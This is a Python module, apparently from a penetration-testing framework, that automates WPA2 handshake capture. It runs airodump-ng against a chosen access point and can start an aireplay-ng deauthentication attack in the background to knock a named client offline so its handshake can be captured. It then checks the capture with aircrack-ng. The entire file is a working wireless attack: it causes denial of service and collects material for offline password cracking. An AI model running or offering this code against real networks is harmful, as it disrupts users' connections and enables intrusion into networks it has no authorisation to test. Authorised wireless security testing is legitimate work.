"""WPA2 handshake capture: targeted airodump + optional aireplay deauth."""

from __future__ import annotations

import threading
import time

from ...core.paths import to_canonical
from ...core.runner import run_cmd, tool_available
from ..base import EvidenceRef, ModuleContext, ModuleResult


def _verify_handshake(pcap_path: str) -> bool:
    """Use aircrack-ng to confirm a handshake is present."""
    if not tool_available("aircrack-ng"):
        return False
    r = run_cmd(["aircrack-ng", pcap_path], timeout=10)
    return "1 handshake" in r.stdout.lower() or "(1 handshake)" in r.stdout.lower()


def capture(ctx: ModuleContext) -> ModuleResult:
    interface = (ctx.params or {}).get("interface")
    bssid = (ctx.params or {}).get("bssid")
    channel = (ctx.params or {}).get("channel")
    if not (interface and bssid and channel):
        return ModuleResult(success=False, error="missing 'interface', 'bssid', or 'channel'")
    if not tool_available("airodump-ng"):
        return ModuleResult(success=False, error="airodump-ng not installed")

    duration = int((ctx.params or {}).get("duration", 90))
    deauth_client = (ctx.params or {}).get("deauth_client")
    ts = ctx.timestamp.strftime("%Y%m%d_%H%M%S")
    out_prefix = ctx.work_dir / f"handshake_{bssid.replace(':', '')}_{ts}"

    capture_cmd = ["timeout", str(duration), "airodump-ng",
                   "-c", str(channel), "--bssid", bssid,
                   "-w", str(out_prefix), interface]

    deauth_thread: threading.Thread | None = None
    deauth_output: list[str] = []
    if deauth_client and tool_available("aireplay-ng"):
        # Run the deauth in a background thread shortly after capture starts.
        def _deauth():
            time.sleep(5)
            r = run_cmd(["aireplay-ng", "-0", "5", "-a", bssid, "-c", deauth_client, interface],
                        timeout=20)
            deauth_output.append(r.combined_output()[-500:])
        deauth_thread = threading.Thread(target=_deauth, daemon=True)
        deauth_thread.start()

    cap_result = run_cmd(capture_cmd, timeout=duration + 15)
    if deauth_thread:
        deauth_thread.join(timeout=1)

    pcap_path = out_prefix.with_suffix(".cap")
    handshake_present = _verify_handshake(str(pcap_path)) if pcap_path.exists() else False
    artifacts = [pcap_path] if pcap_path.exists() else []
    evidence = []
    if pcap_path.exists():
        evidence.append(EvidenceRef(path=to_canonical(pcap_path), kind="pcap",
                                     note="WPA2 handshake capture", host=ctx.worker_host))

    return ModuleResult(
        success=handshake_present,
        artifacts=artifacts,
        evidence=evidence,
        summary=(f"handshake_capture {bssid} ch{channel}: "
                 f"{'CAPTURED' if handshake_present else 'NOT captured'} "
                 f"(deauth={'yes' if deauth_client else 'no'})"),
        error=None if handshake_present else "no handshake captured (try increasing duration or deauthing a client)",
        extra={"handshake_present": handshake_present, "deauth_output": deauth_output[-1] if deauth_output else None},
    )
